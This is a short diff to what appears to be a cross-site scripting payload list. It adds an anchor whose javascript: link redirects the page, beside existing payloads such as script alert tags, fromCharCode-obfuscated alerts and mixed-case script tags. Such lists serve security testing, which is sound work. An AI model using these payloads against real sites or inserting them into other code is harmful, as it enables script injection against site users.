@@ -3,7 +3,7 @@
 <script>alert(String.fromCharCode(88,83,83))</script>
 <a href=javascript:alert(String.fromCharCode(88,83,83))>Click Me!</script>
 <a href=javascript:alert(&quot;XSS&quot;)>Click Me!</script>
-
+<a href="javascript:document.location='http://www.google.com'">Click Me!</a>
 <ScRipT>alert("XSS BY ASHIK");</ScRipT>
 <script>alert(123)</script>
 <script>alert("hellox worldss");</script>
